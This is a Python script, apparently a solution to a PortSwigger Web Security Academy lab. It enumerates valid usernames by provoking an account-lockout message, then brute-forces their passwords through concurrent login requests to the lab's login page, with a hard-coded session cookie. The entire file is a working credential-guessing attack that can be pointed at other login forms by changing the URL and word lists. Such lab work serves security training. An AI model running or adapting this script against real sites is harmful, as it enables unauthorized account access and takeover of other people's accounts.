import time
import aiohttp
import asyncio

url = 'https://acd61f9a1e7d7cc1c05cda8100f30023.web-security-academy.net/login'
cookies = {'session': 'QygVkrOCaoOA3XPEd7cEyvExsxCn1LoT'}

async def test_username(session, name):
    data = {'username': name, 'password': 'a'}
    async with session.post(url=url, data=data) as resp:
        text = await resp.text()
        return (name, 'too many incorrect login attempts' in text.lower())

async def test_password(session, name, password):
    data = {'username': name, 'password': password}
    async with session.post(url=url, data=data) as resp:
        text = await resp.text()
        return (name, password, 'is-warning' in text) # this 'is-warning' string is the class name of the red error messages

async def main():
    async with aiohttp.ClientSession(cookies=cookies) as session:
        tasks = []

        with open('usernames.txt', 'r') as f:
            for name in f.readlines():
                for _ in range(5):
                    tasks.append(asyncio.ensure_future(test_username(session, name.strip())))

        res = await asyncio.gather(*tasks)
        valid_names = []
        for name, resp in res:
            if resp:
                print(f"Found {name}")
                if name not in valid_names:
                    valid_names.append(name)

        tasks = []
        for name in valid_names:
            with open('passwords.txt', 'r') as f:
                for password in f.readlines():
                    tasks.append(asyncio.ensure_future(test_password(session, name, password.strip()))) 

        res = await asyncio.gather(*tasks)
        for name, password, invalid in res:
            if not invalid:
                print(f"Found credentials {name}:{password}")

asyncio.run(main())
